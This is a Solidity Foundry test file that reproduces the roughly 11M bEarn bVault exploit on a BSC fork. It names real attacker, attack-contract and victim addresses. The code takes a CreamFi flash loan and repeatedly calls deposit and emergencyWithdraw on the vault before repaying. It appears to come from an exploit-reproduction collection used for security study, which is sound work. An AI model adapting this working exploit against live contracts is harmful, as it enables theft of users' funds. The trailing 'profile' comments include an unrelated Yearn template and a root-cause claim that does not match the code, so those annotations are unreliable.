// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

import "../interface.sol";

// @KeyInfo - Total Lost : 11M
// Attacker : https://bscscan.com/address/0x47f341d896b08daacb344d9021f955247e50d089
// Attack Contract : https://bscscan.com/address/0xef39f14213714001456e2e89eddbdf8c850c3be6
// Vulnerable Contract : https://bscscan.com/address/0xb390b07fcf76678089cb12d8e615d5fe494b01fb
// Attack Tx : https://bscscan.com/tx/0x603b2bbe2a7d0877b22531735ff686a7caad866f6c0435c37b7b49e4bfd9a36c

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xb390b07fcf76678089cb12d8e615d5fe494b01fb#code

// @Analysis
// Post-mortem : https://bearndao.medium.com/bvaults-busd-alpaca-strategy-exploit-post-mortem-and-bearn-s-compensation-plan-b0b38c3b5540
// Twitter Guy : 
// Hacking God : 
pragma solidity ^0.8.0;

interface ICreamFi {
    function flashLoan(address receiver, uint amount, bytes calldata params) external;
    function getCash() external returns(uint256);
}

interface IBVault {
    function deposit(uint256 _pid, uint256 _wantAmt) external;
    function emergencyWithdraw(uint256 _pid) external;
}

contract bEarn is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 7_457_124;

    address internal CreamFi = 0x2Bc4eb013DDee29D37920938B96d353171289B7C;
    address internal BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address internal bVault = 0xB390B07fcF76678089cb12d8E615d5Fe494b01Fb;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(BUSD);
    }

    function testExploit() public balanceLog {
        //implement exploit code here
        address receiver = address(this);
        uint256 amount = ICreamFi(CreamFi).getCash();
        ICreamFi(CreamFi).flashLoan(receiver, amount, "1");
    }

    function executeOperation(address, address underlying, uint256 amount, uint256 fee, bytes memory) external {
        IERC20(BUSD).approve(bVault, type(uint256).max);

        for(uint256 i=0;i<10;i++) {
            IBVault(bVault).deposit(13, IERC20(underlying).balanceOf(address(this))-1);
            IBVault(bVault).emergencyWithdraw(13);
        }
        
        IERC20(BUSD).transfer(CreamFi, amount+fee);
    }
}

// Profile Template:
// interaction address: t1(dai), t2(usdc), t3(usdt), 
// victim contracts: v0(yvdai), v1(curve)
// dappName: YearnFinance
// Dapp function: DEX
// Attack vector: Initialize t1 and t2, t1.approve(v0), t2.approve(v1), t3.approve(v1), v1.add_liquidity([t1.balanceOf(this), t2.balanceOf(this), 0], 0), v1.remove_liquidity_imbalance([0, 0, t3.balanceOf(this)], 0), v0.deposit(t3.balanceOf(this)), v0.earn(), v1.add_liquidity([0, 0, t3.balanceOf(this)], 0), v0.withdrawAll(), v1.remove_liquidity_imbalance([t1.balanceOf(this) + 1, t2.balanceOf(this) + 1, 0], 0)
// Callback method: NaN
// Validation assertion: v0.balanceOf(c0), v1.balanceOf(c0)
// Root cause: The liquidity pool lacks the balance check adding liquidity and removing liquidity. Logic error incurred price manipulation.

// Profile:
// Ineteraction address: t1(BUSD), f1(CreamFi), c0(this)
// Victim contract: v0(bVault)
// DappName: bEarn Fi
// Dapp function: Aggregator
// Attack vector: f1.flashLoan(t1, f1.getCash(), '1')
// Callback method: f1 callback: t1.approve(v0, uint256.max), v0.deposit(13, t1.balanceOf(c0)-1), v0.emergencyWithdraw(13), t1.transfer(f1, f1.getCash())
// Validation assertion: t1.balanceOf(c0)
// Root cause: The interest rate is not properly calculated in the flashLoan process, allowing the attacker to manipulate the interest rate.